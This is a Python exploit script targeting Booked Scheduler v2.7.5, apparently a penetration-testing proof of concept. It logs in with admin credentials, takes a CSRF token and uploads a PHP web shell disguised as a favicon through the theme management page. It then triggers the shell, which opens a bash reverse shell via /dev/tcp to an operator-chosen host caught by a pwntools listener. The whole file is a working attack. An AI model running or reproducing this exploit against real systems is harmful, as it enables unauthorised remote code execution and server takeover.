#!/usr/bin/env python3

import requests
import re
import sys
import argparse
from time import sleep
from pwn import listen
import threading

# Parse input
parser = argparse.ArgumentParser(description='--- Booked Scheduler v2.7.5 ---')
parser.add_argument('--url', help='url (i.e http://192.168.167.64/booked/Web)')
parser.add_argument('-u', '--user', help='ADMIN user')
parser.add_argument('-p', '--password', help='ADMIN password')
parser.add_argument('-P', '--lport', help='Netcat\'s port to catch reverse shell')
parser.add_argument('-H', '--lhost', help='Netcat\'s host to catch reverse shell')

args = parser.parse_args()
url = args.url
user = args.user
pwd = args.password
lport = args.lport
lhost = args.lhost

class Exploit:
    # Make connection
    def __init__(self, url):
        self.BLUE = '\033[94m'
        self.WARNING = '\033[31m'
        self.END = '\033[0m'
        self.s = requests.Session()
        self.user = user
        self.pwd = pwd
        self.lport = lport
        self.lhost = lhost
        self.payload = payload_php = f'<?php system("bash -c \'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\'"); ?>'
        try:
            print(f"[*] Checking host: {url}")
            sleep(0.5)
            response = self.s.get(url+'/index.php')
            if (response.status_code == 200):
                version = re.findall("Booked Scheduler v2.7.5", response.text)
                if (version):
                    print(f"{self.BLUE}[+]{self.END} Checking version Booked Scheduler v2.7.5: VULNERABLE !!!")
                    sleep(0.5)
                    pass
                else:
                    print(f"[*] May not vulnerable ?! Exiting...")
                    sleep(0.5)
                    sys.exit(0)
                
            else:
                print(f"[*] Please check if your URL is correct !")
                sleep(0.5)
                sys.exit(1)
        except:
            print(f"{self.WARNING}[!]{self.END} Cannot connect to the server !.")
            sleep(0.5)
            sys.exit(1)

    # Check given credentials
    def check_credentials(self, url, user, password):
        data = {
            'email':user,
            'password':password,
            'capcha':'',
            'login':'submit',
            'resume':'',
            'language':'en_us'
                }
        print(f"[*] Checking credentials: {user}:{password}")
        sleep(0.5)
        req = self.s.post(url, data = data, allow_redirects=True)
        if "could not match" in req.text:
            print(f"{self.WARNING}[!]{self.END} Failed to login !")
            sleep(0.5)
            sys.exit(0)
        
        else:
            print(f"{self.BLUE}[+]{self.END} Successfully logged in !.")
            sleep(0.5)

    # Grab CSRF token
    def get_token(self, url):
        try:
            req = self.s.get(url)
            token = re.search(r'name="CSRF_TOKEN" value="(.*)"', str(req.text)).group(1)
            print(f"[*] Grabing token: {token}")
            sleep(0.5)
            return token
        except:
            raise
            print("{self.WARNING}[!]{self.END} Error when grabing token !.")
            sleep(0.5)
            sys.exit(1)
    
    # Upload payload.
    def upload_shell(self, url, payload, admin_token):
        files = {
            'LOGO_FILE':(None, None),
            'FAVICON_FILE':('cmback.php', payload, 'application/x-php'),
            'CSS_FILE':(None, None),
            'CSRF_TOKEN':(None, admin_token)
                } 
        # ?action=update
        params = {'action':'update'}
        headers={
            'X-Requested-With':'XMLHttpRequest',
            'Referer': url,
            'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept':'*/*'
                }
        req = self.s.post(url, files=files, headers=headers, params=params, proxies={'http':'http://127.0.0.1:8080'})
        if (req.status_code == 200):
            print("[*] Uploading backdoor shell...")
            sleep(0.5)
        else:
            print("{self.WARNING}[!]{self.END} Error while uploading payload ... Exit")
            sleep(0.5)
            sys.exit(1)

    # Triggering the shell
    def call_shell(self, url):
        try:
            print("[*] Triggering the shell ... ")
            sleep(0.5)
            res = self.s.get(url)
            print(res.text)
        except:
            pass
    
    # Set up netcat
    def netcat(self):
        listener = listen(self.lport)
        listener.wait_for_connection()
        listener.interactive()

    # Main
    def main(self):
        login_url = url + '/index.php'
        form_location = url + '/admin/manage_theme.php' 
        shell_location = url + '/custom-favicon.php'

        self.check_credentials(login_url, self.user, self.pwd)
        admin_token = self.get_token(form_location)
        self.upload_shell(form_location, self.payload, admin_token)
        thread = threading.Thread(target=self.netcat)
        thread.start()
        self.call_shell(shell_location)



if __name__ == '__main__':
    if len(sys.argv) < 6:
        print("[*] Usage: python3 booked_sheduler.py --url http://127.0.0.1 -u <admin_user> -p <admin_pass> -P <pentester_port> -H <pentester_ip>\n")    
    else:
        exploit = Exploit(url)
        exploit.main()

